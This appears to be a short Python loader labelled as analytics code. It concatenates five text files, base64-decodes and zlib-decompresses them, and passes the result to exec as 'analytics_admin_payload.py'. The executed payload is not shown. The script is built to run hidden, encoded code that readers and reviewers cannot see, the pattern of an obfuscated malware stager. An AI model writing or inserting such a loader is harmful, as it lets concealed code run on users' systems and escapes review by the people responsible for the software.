from pathlib import Path
import base64, zlib

blob = ''.join(Path(f'analytics_payload_{i}.txt').read_text(encoding='utf-8').strip() for i in range(5))
code = zlib.decompress(base64.b64decode(blob)).decode('utf-8')
exec(compile(code, 'analytics_admin_payload.py', 'exec'))
